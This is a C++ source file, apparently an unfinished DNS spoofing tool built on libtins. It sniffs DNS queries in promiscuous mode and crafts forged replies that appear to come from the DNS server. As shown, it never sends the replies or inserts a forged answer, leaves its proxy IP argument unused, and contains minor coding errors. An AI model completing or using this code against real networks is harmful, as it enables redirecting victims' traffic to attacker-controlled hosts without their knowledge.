#include <tins/tins.h>
#include <iostream>
#include <pcap.h>
#include <arpa/inet.h>
#include <string>
#include <memory.h>



#define QUERY_RESPONSE_NO_ERROR 0x8180

struct Attack_Dns_Header{
    uint16_t id;         /* identification number */
    uint16_t flags;      /* dns flags */
    uint16_t q_count;    /* number of question entries */
    uint16_t ans_count;  /* number of answer entries */
    uint16_t auth_count; /* number of authority entries */
    uint16_t add_count;  /* number of resource entries */
};





using namespace Tins;
using namespace std;


void Call_Device(char **C_dev);
char *dev;
pcap_if_t *alldevs;
pcap_if_t *d;
int i=0;
char buf[65000];
Attack_Dns_Header ad;
char Select_device[10];
char errbuf[PCAP_ERRBUF_SIZE];
PacketSender sender;


int main(int argc, char *argv[])
{

    if(argc < 2)
    {
        printf("ex) ./[File Name] [Proxy Ip]\n");
        return 1;
    }
    if (pcap_findalldevs(&alldevs, errbuf) == -1)
        fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);

    for(d=alldevs;d;d=d->next)
        printf("%d. %s \n", ++i, d->name);

    if(i==0)
        printf("\nNo interfaces found! Make sure WinPcap is installed.\n");

    printf("\nSelect Device: ");
    scanf("%s",&Select_device);
    dev = Select_device;
    system("clear");

    // libtins

    SnifferConfiguration config;
    config.set_promisc_mode(true);
    config.set_filter("udp and dst port 53"); //dst port 53
    Sniffer sniffer(dev,config);
    sender.default_interface(dev);

    while(Packet pkt = sniffer.next_packet())
    {
        EthernetII eth = pkt.pdu()->rfind_pdu<EthernetII>();
        IP ip = eth.rfind_pdu<IP>();
        UDP udp = ip.rfind_pdu<UDP>();
        DNS dns = udp.rfind_pdu<RawPDU>().to<DNS>();

        EthernetII spoof_eth;
        IP spoof_ip;
        UDP spoof_udp;
        DNS spoof_dns;

        if (dns.type() == DNS::QUERY)
        {
            for (const auto& query : dns.queries())
            {
                if (query.query_type() == DNS::A)
                {
                    spoof_eth.dst_addr(eth.src_addr()); // spoof_eth.dst_addr --> Gate addr
                    spoof_eth.src_addr(eth.dst_addr()); //spoof_eth.src_addr --> My addr
                    spoof_eth.payload_type(eth.payload_type());

                    //cout<<hex<<spoof_eth.dst_addr()<<"\n";
                    //cout<<hex<<spoof_eth.src_addr()<<"\n";
                    //cout<<hex<<spoof_eth.payload_type()<<"\n";

                    spoof_ip = ip;

                    spoof_ip.src_addr(ip.dst_addr()); // spoof_ip.src_addr --> DNS server addr
                    spoof_ip.dst_addr(ip.src_addr()); // spoof_ip.dst_addr --> My addr

                    //cout<<hex<<spoof_ip.src_addr()<<"\n";
                    //cout<<hex<<spoof_ip.dst_addr()<<"\n";

                    spoof_udp = udp;

                    spoof_udp.sport(udp.dport()); // spoof_udp.sport --> 53
                    spoof_udp.dport(udp.sport()); // spoof_udp.dport --> My port

                    //cout<<spoof_udp.sport()<<"\n";
                    //cout<<spoof_udp.dport()<<"\n";

                    spoof_dns = dns;

                    cout<<spoof_dns.answers_count()<<"\n";


                }

            }
        }

    }

}

